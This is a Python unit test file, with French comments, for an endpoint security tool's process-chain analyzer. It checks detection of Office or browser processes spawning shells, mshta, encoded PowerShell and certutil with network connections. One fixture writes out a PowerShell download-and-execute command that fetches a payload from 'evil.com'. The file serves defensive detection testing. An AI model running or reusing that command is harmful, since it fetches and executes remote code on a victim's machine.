"""Tests unitaires — Process Chain Analyzer"""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "agent", "src"))

from process_monitor.chain_analyzer import ProcessChainAnalyzer
from process_monitor.process_monitor import ProcessNode


def make_node(name, parent_name="explorer.exe", cmdline=None, connections=None):
    return ProcessNode(
        pid=1234,
        name=name,
        exe=f"C:\\Windows\\{name}",
        cmdline=cmdline or [name],
        parent_pid=999,
        parent_name=parent_name,
        create_time=0.0,
        username="user",
        connections=connections or [],
    )


analyzer = ProcessChainAnalyzer()
DUMMY_TREE = {}


def test_office_to_shell_detected():
    """winword.exe → powershell.exe doit être signalé (macro malveillante)."""
    node = make_node("powershell.exe", parent_name="winword.exe")
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.85, f"Score trop bas: {score}"
    assert "macro" in reason.lower() or "shell" in reason.lower()
    print(f"✓ Office→Shell détecté (score={score:.2f}): {reason}")


def test_browser_to_shell_detected():
    """chrome.exe → cmd.exe = drive-by download."""
    node = make_node("cmd.exe", parent_name="chrome.exe")
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.80
    print(f"✓ Browser→Shell détecté (score={score:.2f})")


def test_mshta_always_flagged():
    """mshta.exe lancé depuis n'importe quel parent."""
    node = make_node("mshta.exe", parent_name="explorer.exe")
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.80
    print(f"✓ MSHTA détecté (score={score:.2f})")


def test_encoded_powershell_boosted():
    """PowerShell encodé base64 → score augmenté."""
    node = make_node(
        "powershell.exe",
        parent_name="winword.exe",
        cmdline=["powershell.exe", "-Enc", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="]
    )
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.90
    assert "base64" in reason.lower() or "encodé" in reason.lower()
    print(f"✓ PowerShell encodé détecté (score={score:.2f})")


def test_iex_invoke_expression_detected():
    """IEX dans cmdline → score majoré."""
    node = make_node(
        "powershell.exe",
        parent_name="excel.exe",
        cmdline=["powershell.exe", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"]
    )
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.90
    print(f"✓ IEX détecté (score={score:.2f})")


def test_normal_process_not_flagged():
    """Un processus normal ne doit pas être signalé."""
    node = make_node("notepad.exe", parent_name="explorer.exe", cmdline=["notepad.exe", "readme.txt"])
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score < 0.30, f"Faux positif! score={score} reason={reason}"
    print(f"✓ Processus normal non signalé (score={score:.2f})")


def test_lolbin_with_network():
    """certutil.exe avec connexion réseau = LOLBin suspect."""
    node = make_node(
        "certutil.exe",
        parent_name="cmd.exe",
        connections=[{"raddr": "1.2.3.4:80", "status": "ESTABLISHED"}]
    )
    score, reason = analyzer.analyze(node, DUMMY_TREE)
    assert score >= 0.70
    print(f"✓ LOLBin+réseau détecté (score={score:.2f})")


if __name__ == "__main__":
    print("\n=== Tests Gravity Security — Process Chain Analyzer ===\n")
    test_office_to_shell_detected()
    test_browser_to_shell_detected()
    test_mshta_always_flagged()
    test_encoded_powershell_boosted()
    test_iex_invoke_expression_detected()
    test_normal_process_not_flagged()
    test_lolbin_with_network()
    print("\n✅ Tous les tests passent !\n")
